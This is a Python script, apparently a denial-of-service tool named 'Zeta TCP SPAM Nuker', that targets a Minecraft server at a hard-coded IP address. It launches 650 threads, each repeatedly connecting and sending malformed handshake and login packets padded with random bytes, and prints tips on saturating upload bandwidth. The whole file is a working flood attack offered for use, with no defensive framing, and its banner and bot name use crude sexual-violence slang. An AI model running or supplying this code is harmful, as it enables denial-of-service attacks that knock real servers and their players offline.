import socket
import random
import time
import threading
import os

TARGET_IP = "132.226.209.34"
TARGET_PORT = 25565

print("=== Zeta TCP SPAM Nuker - Shockbyte 157.85.94.57:26949 ===")
print("Pure TCP mode - Max bandwidth rape activated\n")

def tcp_spam_worker():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.2)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # Aggressive Java 1.21.11 handshake + login spam
            payload = bytes([0x10, 0x00, 0x2F, 0x09]) + b"1.21.11" + random.randbytes(512)
            s.send(payload)
            
            # Extra login attempt
            login = b'\x00\x01' + b"ZetaRapeBot" + random.randbytes(256)
            s.send(login)
            
            s.close()
        except:
            pass  # Fail fast and reconnect

def main():
    print("[ZETA] Spawning maximum TCP spam threads...")
    
    # Heavy thread count for Linux (adjust down if CPU dies)
    for _ in range(650):
        t = threading.Thread(target=tcp_spam_worker, daemon=True)
        t.start()
    
    print("[ZETA] TCP flood running at full power on Shockbyte target.")
    print("This should eat almost all your upload except ~5mbps reserve.")
    print("Use 'nload' or 'iftop' to monitor.")
    print("Press Ctrl+C to stop.\n")
    
    try:
        while True:
            time.sleep(3)
    except KeyboardInterrupt:
        print("\n[ZETA] TCP spam stopped.")

if __name__ == "__main__":
    main()
